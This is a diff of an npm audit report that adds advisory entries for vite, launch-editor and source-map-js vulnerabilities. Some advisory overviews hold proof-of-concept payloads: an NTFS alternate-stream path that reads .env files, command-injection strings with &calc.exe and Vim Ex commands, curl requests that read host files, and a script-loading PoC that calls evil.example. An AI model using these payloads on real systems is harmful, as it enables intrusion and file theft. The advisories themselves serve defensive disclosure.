@@ -48,7 +48,7 @@
         }
       ],
       "module": "postcss",
-      "target": "8.5.28",
+      "target": "8.5.33",
       "depth": 3
     },
     {
@@ -77,7 +77,22 @@
         }
       ],
       "module": "nanoid",
-      "target": "3.3.19",
+      "target": "3.3.20",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1241209,
+          "path": ".>vite>postcss>source-map-js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "source-map-js",
+      "target": "1.2.4",
       "depth": 4
     },
     {
@@ -120,7 +135,42 @@
           "bundled": false
         },
         {
-          "id": 1123526,
+          "id": 1242623,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242652,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242659,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242725,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242731,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243433,
           "path": ".>vite",
           "dev": false,
           "optional": false,
@@ -407,46 +457,6 @@
       ],
       "url": "https://github.com/advisories/GHSA-v6wh-96g9-6wx3"
     },
-    "1123526": {
-      "findings": [
-        {
-          "version": "7.1.7",
-          "paths": [
-            ".>vite"
-          ]
-        }
-      ],
-      "found_by": null,
-      "deleted": null,
-      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-fx2h-pf6j-xcff\n- https://nvd.nist.gov/vuln/detail/CVE-2026-53571\n- https://github.com/advisories/GHSA-fx2h-pf6j-xcff",
-      "created": "2026-06-15T17:17:45.000Z",
-      "id": 1123526,
-      "npm_advisory_id": null,
-      "overview": "### Summary\n\nThe contents of files that are specified by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- the sensitive file exists in the allowed directories specified by [`server.fs.allow`](https://vite.dev/config/server-options#server-fs-allow)\n- either of:\n  - the sensitive file exists in an NTFS volume\n  - the dev server is running on Windows and the sensitive file exists in a volume that 8.3 short name generation is enabled (it is enabled by default on system volumes)\n\n### Details\n\nVite’s dev server denies direct access to sensitive files through `server.fs.deny`, including entries such as `.env`, `.env.*`, and `*.{crt,pem}`. However, on Windows, the deny logic does not correctly normalize NTFS ADS path forms before access checks are applied.\nBecause of this, requests such as `/.env::$DATA?raw` are treated as allowed paths, while Windows resolves them to the original file's default data stream.\n\nSimilar to that, Windows allows accessing a file using a different name with the 8.3 short name compatibility feature. Vite did not reject accessing files via them.\n\n### PoC\n```bash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n```\nAccess via browser at `http://localhost:5173/.env::$DATA?raw`\n<img width=\"388\" height=\"129\" alt=\"deecc1315123883cfd0f9c26a002845a\" src=\"https://github.com/user-attachments/assets/895c6012-4e2e-4a35-babb-69bbf3ee7170\" />\n\nExample expected result:\n- `/.env::$DATA?raw` returns the contents of `.env`\n- `/tls.pem::$DATA?raw` returns the contents of `tls.pem`",
-      "reported_by": null,
-      "title": "vite: `server.fs.deny` bypass on Windows alternate paths",
-      "metadata": null,
-      "cves": [
-        "CVE-2026-53571"
-      ],
-      "access": "public",
-      "severity": "high",
-      "module_name": "vite",
-      "vulnerable_versions": ">=7.0.0 <=7.3.4",
-      "github_advisory_id": "GHSA-fx2h-pf6j-xcff",
-      "recommendation": "Upgrade to version 7.3.5 or later",
-      "patched_versions": ">=7.3.5",
-      "updated": "2026-07-15T22:05:54.000Z",
-      "cvss": {
-        "score": 7.5,
-        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
-      },
-      "cwe": [
-        "CWE-22",
-        "CWE-200"
-      ],
-      "url": "https://github.com/advisories/GHSA-fx2h-pf6j-xcff"
-    },
     "1124252": {
       "findings": [
         {
@@ -682,15 +692,290 @@
         "CWE-190"
       ],
       "url": "https://github.com/advisories/GHSA-xwg4-73v4-xw9w"
+    },
+    "1241209": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            ".>vite>postcss>source-map-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93749\n- https://github.com/7rulnik/source-map-js/issues/76\n- https://github.com/7rulnik/source-map-js\n- https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118\n- https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service\n- https://github.com/7rulnik/source-map-js/pull/79\n- https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016\n- https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2\n- https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1241209,
+      "npm_advisory_id": null,
+      "overview": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+      "reported_by": null,
+      "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93749"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "source-map-js",
+      "vulnerable_versions": ">=1.0.0 <1.2.2",
+      "github_advisory_id": "GHSA-68fv-2mgg-jv7q",
+      "recommendation": "Upgrade to version 1.2.2 or later",
+      "patched_versions": ">=1.2.2",
+      "updated": "2026-10-05T23:31:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q"
+    },
+    "1242623": {
+      "findings": [
+        {
+          "version": "7.1.7",
+          "paths": [
+            ".>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112943\n- https://github.com/vitejs/launch-editor/pull/155\n- https://github.com/vitejs/launch-editor/commit/3c2f9bf2ff8fe63d056a8f9cc52d825b66ca79fc\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-698v-4r3x-3vcv",
+      "created": "2026-10-20T18:30:24.000Z",
+      "id": 1242623,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.\n\n### Impact\n\nOnly apps that match all of the following conditions are affected:\n\n- The user uses Windows\n- An attacker can place a file with the malicious filename containing `&` or `%`\n- Either of\n  - An attacker can inject an environment variable with a malicious value\n  - An attacker can add a NTFS alternate data stream to the file placed\n\n### Details\n\nUnlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.\n\nBecause `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.\n\n- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` &calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.\n- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.\n- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `&calc.exe `), they can call `launchEditor` with `./%CD%`",
+      "reported_by": null,
+      "title": "launch-editor: escapeCmdArgs() omits % escaping on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112943"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-698v-4r3x-3vcv",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-20T18:30:25.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-698v-4r3x-3vcv"
+    },
+    "1242652": {
+      "findings": [
+        {
+          "version": "7.1.7",
+          "paths": [
+            ".>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-r825-w8mm-5pxw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112944\n- https://github.com/vitejs/launch-editor/pull/156\n- https://github.com/vitejs/launch-editor/commit/f6e6701bb1f16f2dd242b321374f1b6cca6eb6d4\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-r825-w8mm-5pxw",
+      "created": "2026-10-20T19:51:52.000Z",
+      "id": 1242652,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.\n\n### Impact\n\n#### Direct `launch-editor` users\n\nOnly apps that match all of the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL\n\n#### `launch-editor-middleware` users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- launch-editor older than v2.2.0 is used, or the user is using WSL\n\n#### Vite users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The user is using WSL\n\n### Details\n\n`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:\n```\n+call writefile([\"SAFE_MARKER\"],\"LAUNCH_EDITOR_MARKER\")|qa!\n```\nis not treated as a filename when passed to Vim. Vim executes the embedded Ex command.\n\nThe following editor has a potentially destructive operation exposed to the CLI arguments:\n- Vim (including gVim)\n- MacVim\n- Emacs (including Emacsclient)\n- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n\n`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.\n\nVite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.",
+      "reported_by": null,
+      "title": "launch-editor: Editor CLI flag misinterpretation causing arbitrary command execution for some editors",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112944"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-r825-w8mm-5pxw",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-20T19:51:54.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-88"
+      ],
+      "url": "https://github.com/advisories/GHSA-r825-w8mm-5pxw"
+    },
+    "1242659": {
+      "findings": [
+        {
+          "version": "7.1.7",
+          "paths": [
+            ".>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-587h-7wmj-h5pm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112942\n- https://github.com/vitejs/launch-editor/commit/f13cd835d4b8e860b1d4d080ad8a490cc2463679\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-587h-7wmj-h5pm",
+      "created": "2026-10-20T19:48:25.000Z",
+      "id": 1242659,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.\n\nCombined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.\n\n### Impact\n\nOnly apps that runs on Windows is affected.\n\n### Details\n\nThe earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.\n\nA crafted value ending in `\\\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:\n\n1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.\n2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\\\..`.\n3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.\n4. Because the existence check passes, the crafted filename reaches the Windows shell command.",
+      "reported_by": null,
+      "title": "launch-editor: `fs.existsSync()` existence check can be bypassed on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112942"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-587h-7wmj-h5pm",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-20T19:48:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-77"
+      ],
+      "url": "https://github.com/advisories/GHSA-587h-7wmj-h5pm"
+    },
+    "1242725": {
+      "findings": [
+        {
+          "version": "7.1.7",
+          "paths": [
+            ".>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112945\n- https://github.com/vitejs/vite/pull/23653\n- https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17\n- https://github.com/advisories/GHSA-9jrq-w75r-8gcw",
+      "created": "2026-10-21T16:48:14.000Z",
+      "id": 1242725,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n<script type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy&index=0.js\"></script>\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '<script type=\"module\">document.body.textContent = \"Vite app\"</script>'\n\nconst listen = (server, port = 0) =>\n  new Promise((resolve, reject) => {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () => {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =>\n  new Promise((resolve, reject) => {\n    server.close((error) => (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) => {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) => {\n  vite.middlewares(request, response, async (error) => {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () => document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy&index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
+      "reported_by": null,
+      "title": "Vite: Cross origin script execution through Vite custom middleware",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112945"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-9jrq-w75r-8gcw",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-21T16:48:15.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-80"
+      ],
+      "url": "https://github.com/advisories/GHSA-9jrq-w75r-8gcw"
+    },
+    "1242731": {
+      "findings": [
+        {
+          "version": "7.1.7",
+          "paths": [
+            ".>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-rq7h-c2jc-7f22\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112946\n- https://github.com/vitejs/vite/pull/23656\n- https://github.com/vitejs/vite/commit/170b92791421bcd484f7325936d989a82d6bd4aa\n- https://github.com/vitejs/vite/commit/45c0e3392a298626955a0ab93a8e51232daac721\n- https://github.com/vitejs/vite/commit/c3e06f92e969952466b4e2f5801e85e1e00cd905\n- https://github.com/vitejs/vite/commit/e570d8d016096b5f8f6f09808376ca6cf73f27d0\n- https://github.com/vitejs/vite/commit/f0d76c7da13d5e794807b82f0b86c1931a8438e3\n- https://github.com/advisories/GHSA-rq7h-c2jc-7f22",
+      "created": "2026-10-21T16:47:42.000Z",
+      "id": 1242731,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was possible to be returned.\n\nThe content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `<project-root>/etc/hosts` could make Vite return the host's `/etc/hosts` file.\n\n### Impact\n\nOnly apps that meet all of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))\n- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host\n- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\n- the dev server is not running on Windows\n\n### Details\n\nWhen Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.\n\nFor a later request to `/@fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.\n\n### PoC\nThe following example requires Linux with a readable `/etc/hostname`:\n```bash\n$ mkdir vite-safe-module-path-poc\n$ cd vite-safe-module-path-poc\n$ npm init -y\n$ npm install vite@8.3.1\n$ mkdir -p etc\n$ echo 'PROJECT-DECOY\\n' > etc/hostname\n$ echo 'import \"./etc/hostname\"\\n' > main.js\n$ npx vite --host 127.0.0.1\n```\n\nIn another terminal:\n```bash\n$ curl -o /dev/null -s -w '%{http_code}\\n' http://127.0.0.1:5173/main.js\n200\n$ curl -sS -o response -w '%{http_code}\\n' http://127.0.0.1:5173/@fs/etc/hostname\n200\n$ cmp -s response /etc/hostname && echo 'response matches host file'\nresponse matches host file\n```",
+      "reported_by": null,
+      "title": "Vite: Files outside `server.fs.allow` could be served when project paths match system paths on non-Windows machine",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112946"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-rq7h-c2jc-7f22",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-21T16:47:43.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-284"
+      ],
+      "url": "https://github.com/advisories/GHSA-rq7h-c2jc-7f22"
+    },
+    "1243433": {
+      "findings": [
+        {
+          "version": "7.1.7",
+          "paths": [
+            ".>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-fx2h-pf6j-xcff\n- https://nvd.nist.gov/vuln/detail/CVE-2026-53571\n- https://github.com/advisories/GHSA-fx2h-pf6j-xcff",
+      "created": "2026-06-15T17:17:45.000Z",
+      "id": 1243433,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe contents of files that are specified by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- the sensitive file exists in the allowed directories specified by [`server.fs.allow`](https://vite.dev/config/server-options#server-fs-allow)\n- either of:\n  - the sensitive file exists in an NTFS volume\n  - the dev server is running on Windows and the sensitive file exists in a volume that 8.3 short name generation is enabled (it is enabled by default on system volumes)\n\n### Details\n\nVite’s dev server denies direct access to sensitive files through `server.fs.deny`, including entries such as `.env`, `.env.*`, and `*.{crt,pem}`. However, on Windows, the deny logic does not correctly normalize NTFS ADS path forms before access checks are applied.\nBecause of this, requests such as `/.env::$DATA?raw` are treated as allowed paths, while Windows resolves them to the original file's default data stream.\n\nSimilar to that, Windows allows accessing a file using a different name with the 8.3 short name compatibility feature. Vite did not reject accessing files via them.\n\n### PoC\n```bash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n```\nAccess via browser at `http://localhost:5173/.env::$DATA?raw`\n<img width=\"388\" height=\"129\" alt=\"deecc1315123883cfd0f9c26a002845a\" src=\"https://github.com/user-attachments/assets/895c6012-4e2e-4a35-babb-69bbf3ee7170\" />\n\nExample expected result:\n- `/.env::$DATA?raw` returns the contents of `.env`\n- `/tls.pem::$DATA?raw` returns the contents of `tls.pem`",
+      "reported_by": null,
+      "title": "vite: `server.fs.deny` bypass on Windows alternate paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53571"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.4",
+      "github_advisory_id": "GHSA-fx2h-pf6j-xcff",
+      "recommendation": "Upgrade to version 7.3.5 or later",
+      "patched_versions": ">=7.3.5",
+      "updated": "2026-10-27T14:58:31.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-fx2h-pf6j-xcff"
     }
   },
   "muted": [],
   "metadata": {
     "vulnerabilities": {
       "info": 0,
-      "low": 0,
-      "moderate": 6,
-      "high": 8,
+      "low": 1,
+      "moderate": 10,
+      "high": 9,
       "critical": 0
     },
     "dependencies": 133,
